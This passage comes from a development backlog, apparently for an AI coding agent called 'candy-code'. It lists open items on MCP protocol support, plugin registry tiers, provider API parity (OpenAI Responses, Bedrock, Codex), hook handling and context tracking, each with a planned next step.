  - answer `ping` and `roots/list` (project root) first;
  - elicitation as an ask-style modal in the TUI and `permission.asked kind:"elicitation"` on the web;
  - `list_changed` as a next-launch adoption notice (cache law);
  - sampling only on an owner ruling (billing).
- **MCP server mode** (COMPARISON.md:351 MCP-13). Step: an owner ruling, then `candy-code mcp serve` (stdio) exposing a session's tools under the existing permission gate.
- **MCP surfaces in serve/web and `-p`** (MCP-1-P1). Step: thread the workspace MCP provider through `SessionHost` and NonInteractive; add a web composer `@mcp:` completion.
- **Unified third-party shell posture.** MCP-2-P1, PLG-1-P2 and INT-3's foreign tier all need one provenance-aware `refuseCommandShell` table (project / mcp / bundle / foreign-user) instead of per-tier legs. Step: a single lane after the security fixes.
- **Plugin registry/marketplace tier** (COMPARISON.md §6.5 Plugins row). Step: read-only `bundles search` over a pinned index with sha/signature pins; install still via the hardened `bundles install` (after PLG-1-P1/P2/P3).
- **OpenAI Responses API** (COMPARISON.md:133 MOD-02). Step: an `OpenAIResponsesWire` behind `openai` with `api: "responses"` opt-in (reasoning summaries, encrypted reasoning replay).
- **PRV-4 tier 3 MCP-OAuth extraction** (deferred by design). Step: extract the PKCE loopback flow into a shared `OAuthLoopback` for provider logins.
- **Bedrock request-side thinking/effort** (refused in PRV-2). Step: Converse `additionalModelRequestFields.thinking` for Claude-on-Bedrock, and make Bedrock a `ShapesReasoningEffort`.
- **Codex parity:** `--output-schema` (supportsJsonSchema), `-c model_reasoning_effort=` for `/effort`, and mode → `-s` mapping (PRV-4-P3).
- **CC hook `type: prompt|agent`** still refuses the whole launch (`src/Hooks/ClaudeSettingsHooks.php` type check). Step: skip and record with the same aggregate notice F-1 applied to events. R3 (`Notification` HookEvent) is still an open owner ruling.
- **Documents on non-Anthropic wires** (CTX-2 declined slices: Bedrock Converse `document`, Gemini `inlineData`, OpenAI file parts). Step: one lane, Bedrock first.
- **CTX-3 `@import` children untracked until a refresh point** (`src/Context/InstructionDiffTracker.php:59-63`). Step: stat-track import children once CTX-3-P1 lands.
- **CTX-5 short cache-warm idle tier** (fold before the 5-minute provider cache eviction). It was ruled not-shipped in a lost lane report and is undisclosed. Step: a doc line now and an owner ruling for a lane.
- **VIS-5 parity:** typed `/skill-name` exists only in TUI `Chat::submit()`. Step: hoist `skillInvocationDraft` into `Host\TurnController` for serve/web and `-p`.
